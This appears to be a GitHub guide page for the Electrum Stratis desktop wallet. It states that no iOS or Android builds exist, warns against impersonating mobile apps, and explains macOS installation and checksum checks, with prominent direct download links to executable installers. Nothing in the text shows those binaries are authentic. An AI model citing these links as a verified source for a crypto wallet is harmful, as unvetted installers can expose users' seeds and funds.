![Electrum-Stratis](assets/banner-article.png)

# macOS, iOS and Android: which platforms Electrum Stratis actually runs on

<p align="center">Desktop builds exist; mobile ones do not</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

Electrum Stratis is a desktop wallet for Windows, macOS and Linux. There is no iOS build and no Android app, so any installable claiming to be this wallet on a phone or tablet is not this project. On macOS the disk image is the asset to use, and Gatekeeper's first-run prompt is expected rather than a sign of a bad download. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| Operating system | What exists | What does not |
|---|---|---|
| Windows | Installer and portable assets | A Microsoft Store listing |
| macOS | A disk image | A Mac App Store listing |
| Linux | A packaged archive | Official distribution packages |
| iOS | Nothing | Any app claiming to be this wallet |
| Android | Nothing | Any APK claiming to be this wallet |

</div>

The absence of a mobile build is a design decision, not an oversight: a phone is a networked device with a different threat model, and a desktop wallet with a local file does not map onto it cleanly.

## Why it happens

Wallets are shaped by where their keys live. A desktop wallet keeps an encrypted file on a filesystem, backed up by copying it and by writing a seed on paper. A mobile wallet lives inside an app sandbox with its own backup rules, its own store review process and its own revocation model. Porting between those worlds is a rewrite, not a packaging step. The desktop wallet itself is actively maintained, and its current release is on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19); the missing mobile build is a different decision, not a stalled one.

Consequently the mobile question has a blunt answer. There is no iOS app and no Android app, and no plan is stated for one. Anyone offering an APK, a TestFlight link or a store listing under this name is trading on the brand, and installing it is the single fastest way to lose a seed.

macOS adds a separate wrinkle. The disk image is signed and notarised where possible, but a downloaded application still carries a quarantine flag, so the first launch produces a Gatekeeper prompt. That prompt is the operating system asking whether you meant to run this file - the answer depends on whether you verified the checksum first.

## Fix

1. **Download the macOS asset from the release page.** A disk image from anywhere else is unverifiable, and a macOS user has no second signal beyond the checksum.
2. **Verify the checksum before opening the image.** Compute the hash of the downloaded file and compare it with the published value; this is the step that makes the Gatekeeper decision informed rather than hopeful.
3. **Open the image and drag the application to Applications.** Running it from inside the mounted image works once and disappears on eject, which is a common cause of "my wallet vanished".
4. **Handle the first-launch prompt deliberately.** If Gatekeeper blocks the app, open it from System Settings -> Privacy & Security rather than disabling protection wholesale, and only after the checksum matched.
5. **Launch it once and confirm the build details.** The security posture view shows version, build date, commit hash and advisory status, which ties the running application to the published build.
6. **Create or recover a wallet, then let it sync.** Wallet files live in your user library, not inside the application bundle, so replacing the app later leaves them untouched.

If you need the wallet on a phone, the realistic answer is not to install something that claims to be it. Keep the desktop wallet on a machine you control, and treat mobile access as a separate problem with no product here - the [Electrum Stratis wallet types](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/standard-multisig-imported-wallets.md) explain why a seed does not migrate cleanly between key models.

## If that did not work

If macOS refuses to open the application at all, check the architecture: an Apple silicon machine needs an arm64 build, and an Intel build will not run without translation. A mismatch looks like a corrupt download and is not one.

If the app opens but cannot connect, the installation is fine; the peer connection is the problem, and mobile hotspots, VPNs and corporate networks all interfere with it differently.

If you installed an Android or iOS app that used this name, remove it and treat any seed entered into it as compromised: create a new wallet, move the funds, and stop using the exposed phrase.

If a store listing or a website offers a mobile version, it is impersonation. Reporting it is worth the minute; the next person searching will see the same page.

## Prevention

- Download only the asset listed for your operating system on the release page.
- Verify the checksum before the first launch on macOS.
- Move the application to Applications instead of running it from the mounted image.
- Never install a mobile app claiming to be this wallet; no such app exists.
- Treat any seed typed into a phone as exposed.

## FAQ

### Is there an app for Android?

No. There is no Android build of Electrum Stratis, and an APK using the name is impersonation. The wallet runs on Windows, macOS and Linux desktops only.

### Electrum wallet alternative iOS - what can I use?

Nothing from this project: there is no iOS build. A phone wallet would be a different product with a different key model, and this wallet's seed cannot be imported into an arbitrary mobile app safely.

### Can I run the macOS build on Apple silicon?

Yes, with the asset built for that architecture. An Intel build on an Apple silicon machine either fails to launch or runs under translation, and the failure looks like a damaged download rather than an architecture mismatch.

### Where does the macOS wallet store my files?

In your user library's application support directory, outside the application bundle. Replacing or reinstalling the app therefore leaves the wallet files in place, which is why the application folder is never the thing to back up.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [Where to download the current build](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/where-to-get-the-current-build.md)
- [Which version is current, and is mine real?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/which-release-is-current.md)
- [Install on Windows, step by step](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/install-on-windows-walkthrough.md)
- [Ubuntu and the PyQt4 error](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/linux-pyqt4-error-fix.md)
